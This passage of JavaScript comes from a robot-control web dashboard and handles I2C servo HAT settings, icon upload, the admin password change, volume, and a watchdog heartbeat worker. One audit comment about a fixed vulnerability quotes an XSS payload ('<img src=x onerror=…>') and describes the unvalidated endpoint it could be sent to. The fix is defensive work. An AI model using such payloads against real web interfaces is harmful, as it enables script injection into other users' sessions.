  // distribution + current/recommended markers — visual at-a-glance
  // diagnostic ('drifted right' / 'tightly clustered').
  if (stats) {
    stats.replaceChildren();
    const mkBold = (s) => { const b = document.createElement('b'); b.textContent = String(s); return b; };
    const line1 = document.createElement('div');
    line1.append(mkBold(data.count), document.createTextNode(' samples · min '),
                 mkBold(data.min_ms), document.createTextNode(' · avg '),
                 mkBold(data.avg_ms), document.createTextNode(' · p50 '),
                 mkBold(data.p50_ms), document.createTextNode(' · p95 '),
                 mkBold(data.p95_ms), document.createTextNode(' ms'));
    stats.appendChild(line1);
    const line2 = document.createElement('div');
    line2.append(document.createTextNode('current: '), mkBold(data.current_body_uart_lat_ms + ' ms'),
                 document.createTextNode('  ·  recommended: '));
    const rec = document.createElement('b');
    rec.textContent = data.recommended_body_uart_lat_ms + ' ms';
    rec.style.color = 'var(--accent)';
    line2.appendChild(rec);
    stats.appendChild(line2);
    // W7 mini bar
    const max = Math.max(data.p95_ms, data.current_body_uart_lat_ms, data.recommended_body_uart_lat_ms, 50);
    const bar = document.createElement('div');
    bar.className = 'uart-rtt-bar';
    const segOk = document.createElement('div');
    segOk.className = 'uart-rtt-seg seg-ok';
    segOk.style.left  = `${(data.min_ms / max) * 100}%`;
    segOk.style.width = `${((data.p50_ms - data.min_ms) / max) * 100}%`;
    const segWarn = document.createElement('div');
    segWarn.className = 'uart-rtt-seg seg-warn';
    segWarn.style.left  = `${(data.p50_ms / max) * 100}%`;
    segWarn.style.width = `${((data.p95_ms - data.p50_ms) / max) * 100}%`;
    const mkMarker = (val, cls, label) => {
      const m = document.createElement('div');
      m.className = 'uart-rtt-marker ' + cls;
      m.style.left = `${(val / max) * 100}%`;
      m.title = label + ': ' + val + ' ms';
      return m;
    };
    bar.append(segOk, segWarn,
               mkMarker(data.current_body_uart_lat_ms, 'marker-current', 'current'),
               mkMarker(data.recommended_body_uart_lat_ms, 'marker-rec', 'recommended'));
    stats.appendChild(bar);
  }

  // Fit indicator: how close is the configured value to the recommendation?
  _uartRttRecommendation = data.recommended_body_uart_lat_ms;
  const cur = data.current_body_uart_lat_ms;
  const rec = _uartRttRecommendation;
  const drift = Math.abs(cur - rec);
  if (fit) {
    if (drift <= 5) {
      fit.textContent = '● well tuned';
      fit.style.color = 'var(--ok, #00cc66)';
    } else if (drift <= 15) {
      fit.textContent = '● slight drift';
      fit.style.color = 'var(--warn, #ff8800)';
    } else {
      fit.textContent = '● off — apply suggested';
      fit.style.color = 'var(--err, #ff2244)';
    }
  }
  if (btn) btn.disabled = (rec == null) || (cur === rec);
}

async function applyUartRttRecommendation() {
  if (_uartRttRecommendation == null) return;
  const inp = el('body-uart-lat-input');
  if (!inp) return;
  inp.value = _uartRttRecommendation;
  // Persist + hot-swap immediately — single click flow for calibration
  const ok = await saveBodyUartLat();
  if (!ok) return;
  toast(`UART latency = ${_uartRttRecommendation} ms (hot-swapped, no reboot)`, 'ok');
  const fit = el('uart-rtt-fit');
  if (fit) {
    fit.textContent = '● applied';
    fit.style.color = 'var(--ok, #00cc66)';
  }
  const btn = el('uart-rtt-apply-btn');
  if (btn) btn.disabled = true;
}

// W1+W2 fix 2026-05-16: render live HAT health + servo count preview
// next to each input as operator types. Sources hat_health from /status
// (cockpit panel already uses this — re-render here on every poll).
function _renderHatMeta(inputId, metaId, opts = {}) {
  const inp = el(inputId);
  const meta = el(metaId);
  if (!inp || !meta) return;
  const single = !!opts.single;
  const raw = inp.value.trim();
  if (!raw) { meta.textContent = ''; return; }
  const v = _validateHatList(raw, { single });
  if (!v.ok) {
    meta.innerHTML = '';
    const span = document.createElement('span');
    span.className = 'hat-meta-err';
    span.textContent = '✗ ' + v.error;
    meta.appendChild(span);
    return;
  }
  meta.innerHTML = '';
  // Servo count preview (16 channels per HAT)
  const nHats = v.addrs.length;
  const totalServos = nHats * 16;
  const summary = document.createElement('span');
  summary.className = 'hat-meta-summary';
  summary.textContent = single
    ? `→ Motor HAT @ 0x${v.addrs[0].toString(16)}`
    : `→ ${nHats} HAT${nHats>1?'s':''} · ${totalServos} channels`;
  meta.appendChild(summary);
  // Per-addr health dot from latest /status snapshot
  const prefix = opts.servoPrefix || '';
  const healthArr = opts.healthArr || [];
  v.addrs.forEach((n, i) => {
    const addrHex = '0x' + n.toString(16);
    const chip = document.createElement('span');
    chip.className = 'hat-meta-chip';
    const health = healthArr.find(h => parseInt(h.addr, 16) === n);
    if (health) {
      if (health.ok) {
        chip.classList.add('hat-ok');
        chip.title = `${addrHex}: I2C OK`;
      } else {
        chip.classList.add('hat-bad');
        chip.title = `${addrHex}: I2C ${health.errors || 'no response'}`;
      }
    } else {
      chip.classList.add('hat-unknown');
      chip.title = `${addrHex}: status unknown (save + reboot to detect)`;
    }
    if (single) {
      chip.textContent = '● Motor';
    } else {
      const startId = prefix + (i * 16);
      const endId   = prefix + (i * 16 + 15);
      chip.textContent = `● ${addrHex} (${startId}–${endId})`;
    }
    meta.appendChild(chip);
  });
}

function validateHatField(inputId, single = false) {
  // Decide metaId + servo prefix from input id
  const metaMap = {
    'master-hats-input':       { metaId: 'master-hats-meta',     prefix: 'Servo_M' },
    'slave-hats-input':        { metaId: 'slave-hats-meta',      prefix: 'Servo_S' },
    'slave-motor-hat-input':   { metaId: 'slave-motor-hat-meta', prefix: 'Motor' },
  };
  const cfg = metaMap[inputId];
  if (!cfg) return;
  const latest = _lastStatusForHats || {};
  const healthArr = inputId === 'master-hats-input' ? (latest.dome_hat_health || [])
                  : inputId === 'slave-hats-input'  ? (latest.body_hat_health || [])
                  : (latest.motor_hat_health ? [latest.motor_hat_health] : []);
  _renderHatMeta(inputId, cfg.metaId, { single, servoPrefix: cfg.prefix, healthArr });
}

// Cache latest /status snapshot for HAT health lookups
let _lastStatusForHats = null;

// W9 fix 2026-05-16: reset HAT inputs to single-HAT defaults
function resetHatDefaults() {
  if (!confirm('Reset HAT addresses to single-HAT defaults? (You still need to SAVE to persist.)')) return;
  const m = el('master-hats-input'); if (m) m.value = '0x40';
  const s = el('slave-hats-input');  if (s) s.value = '0x41';
  const mh= el('slave-motor-hat-input'); if (mh) mh.value = '0x40';
  validateHatField('master-hats-input');
  validateHatField('slave-hats-input');
  validateHatField('slave-motor-hat-input', true);
  if (typeof toast === 'function') toast('Defaults loaded — click SAVE to persist', 'info');
}

// W14 fix 2026-05-16: i2cdetect scan via new diagnostics endpoint.
// Operator clicks SCAN → backend runs i2cdetect → returns detected
// addrs → frontend shows chips with quick-fill action.
async function scanI2cBus() {
  const out = el('i2c-scan-result');
  if (out) { out.textContent = 'Scanning I2C bus...'; out.className = 'settings-status'; }
  const res = await apiDetail('/diagnostics/i2c_scan').catch(() => null);
  if (!res || !res.ok) {
    if (out) { out.textContent = '✗ ' + (res?.error || 'scan failed'); out.className = 'settings-status error'; }
    return;
  }
  const d = res.data || {};
  if (!out) return;
  out.innerHTML = '';
  const title = document.createElement('div');
  const addrs = Array.isArray(d.detected) ? d.detected : [];
  title.textContent = addrs.length
    ? `Detected ${addrs.length} I2C device${addrs.length>1?'s':''} on Master:`
    : 'No I2C devices detected on Master (HAT not powered / not connected?)';
  out.appendChild(title);
  addrs.forEach(addr => {
    const chip = document.createElement('button');
    chip.className = 'btn btn-sm';
    chip.style.cssText = 'margin:4px 4px 0 0;font-family:var(--font-data);font-size:11px';
    const inPcaRange = (addr >= 0x40 && addr <= 0x77);
    chip.textContent = `0x${addr.toString(16)}${inPcaRange ? '' : ' (not PCA9685)'}`;
    if (!inPcaRange) chip.disabled = true;
    chip.onclick = () => {
      const m = el('master-hats-input');
      if (m) {
        const cur = m.value.trim();
        const hex = '0x' + addr.toString(16);
        if (!cur) m.value = hex;
        else if (!cur.split(',').map(p => p.trim()).includes(hex)) m.value = cur + ', ' + hex;
        validateHatField('master-hats-input');
        toast(`Appended ${hex} to Master HATs`, 'info');
      }
    };
    out.appendChild(chip);
  });
  out.className = 'settings-status ok';
}

// W5 fix 2026-05-16: client-side hex validation (matches backend
// _HAT_ADDR_RE + PCA9685 0x40-0x77 range + dedup).
function _validateHatList(s, opts = {}) {
  const single = !!opts.single;
  if (!s) return { ok: false, error: 'empty' };
  const parts = s.split(',').map(p => p.trim()).filter(Boolean);
  if (single && parts.length !== 1) return { ok: false, error: 'expected single address' };
  const addrs = [];
  for (const p of parts) {
    if (!/^0x[0-9a-fA-F]{2}$/.test(p)) return { ok: false, error: `invalid hex: ${p}` };
    const n = parseInt(p, 16);
    if (n < 0x40 || n > 0x77) return { ok: false, error: `${p} out of PCA9685 range (0x40-0x77)` };
    addrs.push(n);
  }
  if (addrs.length !== new Set(addrs).size) return { ok: false, error: 'duplicate address' };
  return { ok: true, addrs };
}

async function saveHardwareConfig() {
  // HAT-only save. Body UART latency has its own live save (auto-save on
  // blur, or APPLY & SAVE button) and is intentionally NOT bundled here.
  const masterHats   = (el('master-hats-input')?.value     || '').trim();
  const slaveHats    = (el('slave-hats-input')?.value      || '').trim();
  const slaveMotor   = (el('slave-motor-hat-input')?.value || '').trim();
  const status = el('hardware-config-status');
  if (!masterHats || !slaveHats || !slaveMotor) { toast('HAT addresses are required', 'error'); return; }

  // W5 fix: client-side validation BEFORE round-trip
  const vM = _validateHatList(masterHats);
  if (!vM.ok) { toast('Master HATs: ' + vM.error, 'error'); return; }
  const vS = _validateHatList(slaveHats);
  if (!vS.ok) { toast('Slave HATs: ' + vS.error, 'error'); return; }
  const vMot = _validateHatList(slaveMotor, { single: true });
  if (!vMot.ok) { toast('Slave Motor HAT: ' + vMot.error, 'error'); return; }
  // W3 fix: motor/servo collision client-side
  if (vS.addrs.includes(vMot.addrs[0])) {
    toast(`Collision: ${slaveMotor} is in both Slave HATs and Motor HAT`, 'error');
    return;
  }

  // Diff against the snapshot taken at load time so we send only what
  // genuinely changed.
  // B12 fix 2026-05-16: normalize whitespace for diff so '0x40,0x42'
  // vs '0x40, 0x42' (same canonical value) doesn't fire a spurious
  // 'changed' detection.
  const norm = (s) => (s || '').replace(/\s+/g, '').toLowerCase();
  const loaded = _hardwareLoaded || {};
  const payload = {};
  let masterHatChanged = false, slaveHatChanged = false;
  if (norm(masterHats) !== norm(loaded.master_hats))     { payload['i2c_servo_hats.master_hats']     = masterHats;  masterHatChanged = true; }
  if (norm(slaveHats)  !== norm(loaded.slave_hats))      { payload['i2c_servo_hats.slave_hats']      = slaveHats;   slaveHatChanged  = true; }
  if (norm(slaveMotor) !== norm(loaded.slave_motor_hat)) { payload['i2c_servo_hats.slave_motor_hat'] = slaveMotor;  slaveHatChanged  = true; }

  if (!masterHatChanged && !slaveHatChanged) {
    toast('No changes to save', 'info');
    if (status) { status.textContent = 'No changes'; status.className = 'settings-status'; }
    return;
  }

  const consequences = [];
  if (masterHatChanged) consequences.push('• Master reboot required (servo HAT count change)');
  if (slaveHatChanged)  consequences.push('• Slave service will auto-restart');
  if (!confirm('Save hardware config?\n\n' + consequences.join('\n'))) return;

  // W4 fix 2026-05-16: withSaveFeedback for spinner/checkmark parity
  const btn = document.querySelector('#spanel-hats button.btn-primary');
  const run = async () => {
    if (status) { status.textContent = 'Saving…'; status.className = 'settings-status'; }
    const data = await apiDetail('/settings/config', 'POST', payload);
    if (data.ok) {
      if (masterHatChanged) loaded.master_hats = masterHats;
      if (slaveHatChanged)  { loaded.slave_hats = slaveHats; loaded.slave_motor_hat = slaveMotor; }
      _hardwareLoaded = loaded;
      let msgOk;
      if (masterHatChanged && slaveHatChanged) msgOk = 'Saved — Master reboot required · Slave restarting';
      else if (masterHatChanged)               msgOk = 'Saved — Master reboot required';
      else                                     msgOk = 'Saved — Slave auto-restarting';
      toast(msgOk, 'ok');
      if (status) { status.textContent = '✓ ' + msgOk; status.className = 'settings-status ok'; }
      // B15 fix 2026-05-16: persistent banner with REBOOT NOW button
      // so operator doesn't forget. Survives until they reboot or
      // dismiss the page.
      if (masterHatChanged) {
        const banner = el('hat-reboot-banner');
        if (banner) banner.style.display = '';
      }
      // B8 fix: poll Slave sync status ~4s after save (SCP + restart ~3s)
      if (slaveHatChanged) {
        setTimeout(async () => {
          const sync = await api('/settings/slave_hat_sync_status').catch(() => null);
          if (sync && sync.attempted && !sync.ok && sync.error !== 'running') {
            toast(`Slave HAT sync failed: ${sync.error}`, 'error');
            if (status) { status.textContent = '✗ Slave sync failed'; status.className = 'settings-status error'; }
          }
        }, 4000);
      }
      return true;
    } else {
      const err = data.error || 'unknown';
      toast('Save failed: ' + err, 'error');
      if (status) { status.textContent = '✗ ' + err; status.className = 'settings-status error'; }
      return false;
    }
  };
  if (btn && typeof withSaveFeedback === 'function') withSaveFeedback(btn, run);
  else run();
}

// E15 fix 2026-05-16: was hardcoded #00aaff/#00ffea → didn't follow
// the active theme (R5-D4 red, BB-8 orange, etc.). currentColor lets
// the SVG inherit the parent's color which is set to var(--blue) via
// CSS, so the logo retints with each theme.
const _R2_LOGO_SVG = `<svg class="r2-logo" width="32" height="32" viewBox="0 0 32 32"><circle cx="16" cy="10" r="9" fill="none" stroke="currentColor" stroke-width="1.5"/><rect x="8" y="17" width="16" height="11" rx="2" fill="none" stroke="currentColor" stroke-width="1.5"/><circle cx="11" cy="10" r="2" fill="currentColor" opacity="0.8"/><circle cx="21" cy="10" r="2" fill="currentColor" opacity="0.8"/><rect x="12" y="7" width="8" height="4" rx="1" fill="currentColor" opacity="0.3"/></svg>`;

let _currentRobotIcon = '';

function _applyRobotIcon(icon) {
  _currentRobotIcon = icon || '';
  const wrap = el('header-robot-icon');
  if (wrap) {
    if (!icon) {
      wrap.innerHTML = _R2_LOGO_SVG;
    } else if (icon.startsWith('img:')) {
      const fname = icon.slice(4);
      // B-39 (audit 2026-05-15): img path is fine but build via DOM so
      // a future change can't accidentally re-introduce an interpolation
      // sink. img.src setter URL-encodes for us.
      wrap.replaceChildren();
      const img = document.createElement('img');
      img.className = 'brand-icon-img';
      img.src = '/icons/' + encodeURIComponent(fname);
      img.alt = 'icon';
      wrap.appendChild(img);
    } else {
      // B-39 (audit 2026-05-15): the emoji branch previously dropped
      // `icon` straight into innerHTML. Server-side (B-9) had no
      // validation, so any LAN client could POST /settings/robot_icon
      // with `<img src=x onerror=…>` and trigger XSS on every
      // dashboard load. textContent neutralises any payload.
      wrap.replaceChildren();
      const span = document.createElement('span');
      span.className = 'brand-icon-emoji';
      span.textContent = icon;
      wrap.appendChild(span);
    }
  }
  // Highlight selected button in picker
  document.querySelectorAll('.icon-picker-btn').forEach(b => {
    b.classList.toggle('selected', b.dataset.icon === _currentRobotIcon);
  });
}

async function saveRobotIcon(icon) {
  const d = await api('/settings/robot_icon', 'POST', { icon });
  if (d?.status === 'ok') {
    _applyRobotIcon(icon);
    toast(icon ? 'Icon updated' : 'Icon reset to default', 'ok');
  }
}

async function loadIconPicker() {
  const grid = el('icon-picker-grid');
  if (!grid) return;
  const d = await api('/settings/icons', 'GET');
  if (!d?.icons) return;

  // Default SVG button first
  const defaultBtn = document.createElement('button');
  defaultBtn.className = 'icon-picker-btn' + (_currentRobotIcon === '' ? ' selected' : '');
  defaultBtn.dataset.icon = '';
  defaultBtn.title = 'Default (AstromechOS logo)';
  defaultBtn.innerHTML = `<svg width="22" height="22" viewBox="0 0 32 32"><circle cx="16" cy="10" r="9" fill="none" stroke="currentColor" stroke-width="1.5"/><rect x="8" y="17" width="16" height="11" rx="2" fill="none" stroke="currentColor" stroke-width="1.5"/><circle cx="11" cy="10" r="2" fill="currentColor" opacity="0.8"/><circle cx="21" cy="10" r="2" fill="currentColor" opacity="0.8"/><rect x="12" y="7" width="8" height="4" rx="1" fill="currentColor" opacity="0.3"/></svg>`;
  defaultBtn.addEventListener('click', () => saveRobotIcon(''));
  grid.appendChild(defaultBtn);

  // One thumbnail per image file
  d.icons.forEach(fname => {
    const iconVal = 'img:' + fname;
    const btn = document.createElement('button');
    btn.className = 'icon-picker-btn' + (_currentRobotIcon === iconVal ? ' selected' : '');
    btn.dataset.icon = iconVal;
    btn.title = fname;

    const img = document.createElement('img');
    img.src = '/icons/' + encodeURIComponent(fname);
    img.alt = fname;
    img.style.cssText = 'width:30px;height:30px;object-fit:contain;border-radius:4px';
    btn.appendChild(img);

    // Right-click → delete
    btn.addEventListener('contextmenu', async e => {
      e.preventDefault();
      if (!confirm(`Delete icon "${fname}"?`)) return;
      const r = await api('/settings/icons/delete', 'POST', { filename: fname });
      if (r?.status === 'ok') {
        btn.remove();
        if (_currentRobotIcon === iconVal) saveRobotIcon('');
        toast(`Deleted ${fname}`, 'ok');
      }
    });

    btn.addEventListener('click', () => saveRobotIcon(iconVal));
    grid.appendChild(btn);
  });
}

async function uploadIcon(input) {
  const status = el('icon-upload-status');
  const file = input.files[0];
  if (!file) return;
  // B-89 (audit 2026-05-15): cap upload size client-side at 2 MB.
  // An icon is typically <100KB; anything bigger is either a mistake
  // (someone dragged a photo) or abuse. Server-side cap belongs in a
  // future Flask MAX_CONTENT_LENGTH setting; this gate gives users
  // instant feedback without hitting the network.
  const MAX_SIZE = 2 * 1024 * 1024;
  if (file.size > MAX_SIZE) {
    if (status) {
      status.textContent = `Too large (${(file.size/1024/1024).toFixed(1)}MB > 2MB)`;
      status.style.color = 'var(--warn)';
    }
    input.value = '';
    setTimeout(() => { if (status) status.textContent = ''; }, 4000);
    return;
  }
  if (status) status.textContent = 'Uploading…';

  const form = new FormData();
  form.append('file', file);
  try {
    // B-71 (audit 2026-05-15): attach X-Admin-Pw header explicitly.
    // The global api() helper handles JSON bodies; multipart uploads
    // can't use it directly, so we add the header manually. Without
    // this, the upload silently 401s after B-7's admin-auth fix
    // landed.
    const headers = {};
    if (typeof adminGuard !== 'undefined') {
      const tok = adminGuard.getToken && adminGuard.getToken();
      if (tok) headers['X-Admin-Pw'] = tok;
    }
    const base = (typeof window.R2D2_API_BASE === 'string' && window.R2D2_API_BASE) ? window.R2D2_API_BASE : '';
    const r = await fetch(base + '/settings/icons/upload',
                          { method: 'POST', body: form, headers });
    if (r.status === 401) {
      if (status) { status.textContent = 'Admin authentication required'; status.style.color = 'var(--warn)'; }
      input.value = '';
      setTimeout(() => { if (status) status.textContent = ''; }, 4000);
      return;
    }
    const d = await r.json();
    if (d.status === 'ok') {
      if (status) { status.textContent = '✓ Uploaded'; status.style.color = 'var(--ok)'; }
      const grid = el('icon-picker-grid');
      if (grid) { grid.innerHTML = ''; await loadIconPicker(); }
      await saveRobotIcon('img:' + d.filename);
    } else {
      if (status) { status.textContent = d.error || 'Upload failed'; status.style.color = 'var(--warn)'; }
    }
  } catch {
    if (status) { status.textContent = 'Upload failed'; status.style.color = 'var(--warn)'; }
  }
  input.value = '';
  setTimeout(() => { if (status) status.textContent = ''; }, 4000);
}

// Wire up icon picker (called once DOM is ready)
function _initIconPicker() {
  loadIconPicker();
}

function _applyLocationLabels(master, slave) {
  const newMaster = master || 'Dome';
  const newSlave  = slave  || 'Body';
  // EARLY EXIT if neither value has changed since last apply. StatusPoller
  // fires this every 2 seconds with the cached server values. The old
  // unconditional path called renderCalibration() each time, which
  // does container.innerHTML='' on the Calibration page — destroying every
  // <input> element 2× per second. Result: user could never finish typing
  // a new servo label, and the card visibly flickered (.card:hover glow
  // toggling as the card vanished and reappeared under the cursor).
  // Reported by user 2026-05-14 — bug introduced with multi-HAT
  // auto-detection refactor that added the renderCalibration() call here.
  if (newMaster === _masterLocation && newSlave === _slaveLocation) return;

  _masterLocation = newMaster;
  _slaveLocation  = newSlave;
  const mu = _masterLocation.toUpperCase();
  const su = _slaveLocation.toUpperCase();
  const joyLbl = el('joystick-master-label');
  if (joyLbl) joyLbl.textContent = mu;
  const domeBtn = el('chor-btn-dome');
  if (domeBtn) domeBtn.textContent = `+ ${mu}`;
  const domeSrv = el('chor-btn-dome-srv');
  if (domeSrv) domeSrv.textContent = `+ ${mu} SRV`;
  const bodySrv = el('chor-btn-body-srv');
  if (bodySrv) bodySrv.textContent = `+ ${su} SRV`;
  // Pre-fill settings inputs if not focused
  const mInput = el('master-location-input');
  if (mInput && !mInput.matches(':focus')) mInput.value = _masterLocation;
  const sInput = el('slave-location-input');
  if (sInput && !sInput.matches(':focus')) sInput.value = _slaveLocation;
  // Re-render calibration headers (only runs when locations actually changed)
  renderCalibration();
}

async function saveRobotLocations() {
  // W4 fix 2026-05-16: return bool for withSaveFeedback
  const master = el('master-location-input')?.value.trim();
  const slave  = el('slave-location-input')?.value.trim();
  const status = el('robot-locations-status');
  if (!master || !slave) {
    if (status) { status.textContent = 'Both fields required'; status.className = 'settings-status error'; }
    return false;
  }
  if (status) { status.textContent = 'Saving…'; status.className = 'settings-status'; }
  // B3 surface backend validation error
  const res = await apiDetail('/settings/robot_locations', 'POST', { master_location: master, slave_location: slave });
  if (res.ok && res.data?.status === 'ok') {
    _applyLocationLabels(master, slave);
    toast(`Locations: ${master} / ${slave}`, 'ok');
    if (status) { status.textContent = 'Saved'; status.className = 'settings-status ok'; }
    return true;
  }
  const errMsg = res.error || 'Error';
  if (status) { status.textContent = errMsg; status.className = 'settings-status error'; }
  toast(`Locations failed: ${errMsg}`, 'error');
  return false;
}

async function saveRobotName() {
  const input  = el('robot-name-input');
  const status = el('robot-name-status');
  const name   = input?.value.trim();
  if (!name) {
    if (status) { status.textContent = 'Name cannot be empty.'; status.style.color = 'var(--warn)'; }
    return false;
  }
  const res = await apiDetail('/settings/robot_name', 'POST', { name });
  if (res.ok && res.data?.status === 'ok') {
    const headerName = el('header-robot-name');
    if (headerName) headerName.textContent = name;
    if (status) { status.textContent = 'Saved ✓'; status.style.color = 'var(--ok)'; }
    toast(`Robot name set to "${name}"`, 'ok');
    return true;
  }
  const errMsg = res.error || 'Error saving name.';
  if (status) { status.textContent = errMsg; status.style.color = 'var(--warn)'; }
  toast(`Name failed: ${errMsg}`, 'error');
  return false;
}

async function adminChangePassword() {
  // B3 fix 2026-05-16: was leaving adminGuard._token = OLD password →
  // every subsequent admin call sent stale X-Admin-Pw → server compared
  // vs NEW pwd → 401 cascade. Cryptic 're-auth may be needed' errors.
  const current  = el('admin-pwd-current')?.value  || '';
  const newPwd   = el('admin-pwd-new')?.value      || '';
  const confirm_ = el('admin-pwd-confirm')?.value  || '';
  const status   = el('admin-pwd-status');

  const setStatus = (msg, ok) => {
    if (!status) return;
    status.textContent = msg;
    status.style.color = ok ? 'var(--ok)' : 'var(--warn)';
  };

  if (!current)            { setStatus('Enter your current password.', false); return false; }
  if (newPwd.length < 4)   { setStatus('New password must be at least 4 characters.', false); return false; }
  if (newPwd !== confirm_) { setStatus('Passwords do not match.', false); return false; }
  if (newPwd === current)  { setStatus('New password must differ from current.', false); return false; }

  const res = await apiDetail('/settings/admin/password', 'POST', { current, new: newPwd });
  if (res.ok && res.data?.ok) {
    setStatus('Password changed ✓', true);
    el('admin-pwd-current').value = '';
    el('admin-pwd-new').value     = '';
    el('admin-pwd-confirm').value = '';
    if (typeof adminGuard !== 'undefined') {
      adminGuard._token = newPwd;
    }
    toast('Admin password updated — session re-keyed', 'ok');
    return true;
  }
  setStatus(res.error || 'Error — check your current password.', false);
  return false;
}

// ================================================================
// Volume slider
// ================================================================

// ALSA bcm2835 maps 0-100% linearly onto ~-102dB..+4dB,
// so 50% ALSA ≈ -49dB (nearly inaudible).
// Square-root curve makes slider 50% → ALSA 71% (≈-28dB, usable).
function _sliderToAlsa(v) { return Math.round(Math.pow(v / 100, 1 / 3) * 100); }
function _alsaToSlider(v) { return Math.round(Math.pow(v / 100, 3) * 100); }

function initVolume() {
  const slider = document.getElementById('volume-slider');
  const label  = document.getElementById('volume-label');
  if (!slider) return;

  // Load current ALSA volume → convert back to slider position
  api('/audio/volume').then(d => {
    if (d && d.volume !== undefined) {
      slider.value = _alsaToSlider(d.volume);
      label.textContent = slider.value + '%';
      _updateSliderBg(slider);
    }
  });

  let _debounceTimer = null;

  slider.addEventListener('input', () => {
    let sliderVal = parseInt(slider.value, 10);
    // L1-W fix 2026-05-15: snap to common detents within ±2% on
    // tablet for easier landing on 25/50/75/100.
    const snaps = [25, 50, 75, 100];
    for (const s of snaps) {
      if (Math.abs(sliderVal - s) <= 2) { sliderVal = s; slider.value = s; break; }
    }
    label.textContent = sliderVal + '%';
    _updateSliderBg(slider);
    clearTimeout(_debounceTimer);
    _debounceTimer = setTimeout(() => {
      api('/audio/volume', 'POST', { volume: _sliderToAlsa(sliderVal) }).catch(() => {});
    }, 150);
  });
}

function _updateSliderBg(slider) {
  const pct = ((slider.value - slider.min) / (slider.max - slider.min)) * 100;
  slider.style.setProperty('--val', pct.toFixed(1) + '%');
}

// ================================================================
// Audio helpers exposed globally
// ================================================================

async function loadAudioCategories() {
  await audioBoard.loadCategories();
}

// ================================================================
// Init
// ================================================================

// ================================================================
// App Heartbeat — alimente l'AppWatchdog côté Master
// ================================================================

function startAppHeartbeat() {
  const base = () => (typeof window.R2D2_API_BASE === 'string' && window.R2D2_API_BASE) ? window.R2D2_API_BASE : '';

  // 2026-05-15 (bug fix): heartbeat moved to a Web Worker. User-reported
  // that loading a heavy choreo (lots of blocks → long sync render)
  // blocked the main thread long enough that the 600ms AppWatchdog
  // window expired → R3 fix fired E-STOP → operator saw "E-STOP active"
  // appear unexpectedly after a routine choreo load.
  //
  // Root cause: setInterval callbacks can't fire while the main thread
  // is blocked by synchronous work. So a 1.2s _renderAllTracks() =
  // 6 missed heartbeats in a row = watchdog fires.
  //
  // Fix: heartbeat runs in a Worker on its own thread. Main thread can
  // block 5s for render, the worker keeps posting. Safety semantics
  // preserved (worker stops on visibilitychange + page close).
  let _hbWorker = null;

  function _hbStart() {
    if (_hbWorker) return;
    try {
      // Inline worker — no separate .js file to ship.
      // 2026-05-15 revert M2: back to fire-and-forget. The response-
      // parsing variant caused the user's tablet to stop sending HBs
      // after deploy (root cause TBD — possibly SW caching, possibly
      // a race in the chained promise). Reverting to the proven
      // simple form. M2 sync via heartbeat is deferred.
      const workerSrc = `
        let _url = '';
        let _timer = null;
        self.onmessage = function(e) {
          const d = e.data || {};
          if (d.type === 'start') {
            _url = d.url;
            if (_timer) clearInterval(_timer);
            _timer = setInterval(() => {
              fetch(_url, { method: 'POST' }).catch(() => {});
            }, 200);
          } else if (d.type === 'stop') {
            if (_timer) { clearInterval(_timer); _timer = null; }
          }
        };
      `;
      const blob = new Blob([workerSrc], { type: 'application/javascript' });
      _hbWorker = new Worker(URL.createObjectURL(blob));
      // 2026-05-15 bug: relative URL inside a blob Worker resolves
      // against blob:... origin, not the document. Pass absolute URL
      // so the Worker hits the right host. User-reported: APP HB pill
      // stuck red after deploy even with hard reload — root cause was
      // worker fetch failing silently due to relative URL resolution.
      const hbUrl = base()
        ? base() + '/heartbeat'
        : `${location.protocol}//${location.host}/heartbeat`;
      _hbWorker.postMessage({ type: 'start', url: hbUrl });
    } catch (e) {
      // Fallback to main-thread interval if Worker creation fails (very
      // old browsers / CSP blocking blob: workers). Less robust but
      // better than no heartbeat at all.
      console.warn('Heartbeat worker unavailable, falling back to setInterval', e);
      // Bug H6 fix 2026-05-15: surface to operator. Fallback re-enables
      // the exact failure mode the worker fix prevented (false E-STOP
      // on heavy renders) — operator needs to know they're degraded.
      // Toast only once per session via window flag.
      if (typeof toast === 'function' && !window._hbFallbackWarned) {
        window._hbFallbackWarned = true;
        toast('Heartbeat fallback active — heavy renders may trigger false E-STOP', 'warn');
      }
      _hbWorker = { _fallback: setInterval(() => {
        fetch(base() + '/heartbeat', { method: 'POST' }).catch(() => {});
      }, 200) };
    }
  }
  function _hbStop() {
    if (!_hbWorker) return;
    if (_hbWorker._fallback) {
      clearInterval(_hbWorker._fallback);
    } else {
      try { _hbWorker.postMessage({ type: 'stop' }); _hbWorker.terminate(); }
      catch {}
    }
    _hbWorker = null;
  }

  document.addEventListener('visibilitychange', () => {
    if (document.visibilityState === 'visible') _hbStart();
    else                                        _hbStop();
  });
  if (document.visibilityState === 'visible') _hbStart();

  // Emergency stop when the tab/app actually closes
  window.addEventListener('beforeunload', (e) => {
    fetch(base() + '/motion/stop', { method: 'POST', keepalive: true }).catch(() => {});
    fetch(base() + '/motion/dome/stop', { method: 'POST', keepalive: true }).catch(() => {});
    // Bug M1 fix 2026-05-15: stop the HB worker on page unload. Without
    // this, bfcache restoration could spawn a second worker → double-
    // rate heartbeats + memory leak after many back/forward navigations.
    try { _hbStop(); } catch {}
    // Audit finding Frontend H-3 2026-05-15: warn before leaving if
    // the Choreo editor has unsaved changes. Most browsers ignore the
    // custom string and show their own generic prompt, but the prompt
    // itself appears as long as we call preventDefault + returnValue.
    if (typeof choreoEditor !== 'undefined' && choreoEditor.hasUnsavedChanges
        && choreoEditor.hasUnsavedChanges()) {
      e.preventDefault();
      e.returnValue = 'Choreo editor has unsaved changes.';
      return e.returnValue;
    }
  });
}

// ================================================================
// Init
// ================================================================

async function init() {
  // Init speed slider gradient
  setSpeed(60);

  // Clock
  updateClock();
  setInterval(updateClock, 1000);

  // Heartbeat applicatif vers Master (sécurité watchdog)
  startAppHeartbeat();

  // Lock Manager init (kids speed slider + body data-lock-mode)
  lockMgr.init();

  // Camera stream (Drive tab center)
  _initCameraStream();

  // Volume slider + VESC scale slider
  initVolume();
  vescPanel.initSlider();
  vescPanel.loadConfig();

  // Load initial data
  await Promise.all([
    audioBoard.loadCategories(),
    scriptEngine.load(),
    poller.poll(),
    loadServoSettings(),
    btController.loadConfig(),
    cameraConfig.load(),
    armsConfig.load(),
    shortcutsRunner.load(),
  ]);

  // Start polling
  poller.start(2000);

  // F-8 (audit 2026-05-15): only refresh while the Sequences tab is
  // actually visible. Old code fired /choreo/list + /choreo/categories
  // every 15s regardless of which tab the operator was on — wasted
  // bandwidth on Pi 4B and competed with motion commands during drive.
  // The drag guard stays for the case where the user is mid-drag and
  // the timer ticks.
  setInterval(() => {
